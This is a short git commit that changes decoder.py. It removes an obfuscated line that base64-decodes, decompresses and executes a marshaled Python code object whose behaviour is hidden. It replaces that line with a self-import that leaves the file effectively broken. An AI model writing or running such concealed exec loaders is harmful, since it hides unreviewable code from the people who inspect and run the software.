9ea281e21b312a76931194c5d91f1c408bef843a
_FlameVortex <160109584+FlameVortex@users.noreply.github.com>
2026-03-15 21:47:50 +0600

    Refactor decoder.py to import itself

--- decoder.py
+++ decoder.py
@@ -1,3 +1,1 @@
-
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("eJx7zIAEmKD0Zx4gMZ0hhSGFMYchiqGSUZPpJUjcT5PxFntKanJ+SmrRSobPIKFbDLc4bHLzU0pzUu2K2IECjEBczAEkPjAzMjLeYeArYgVyAJ0CE2w="))))
+import decoder
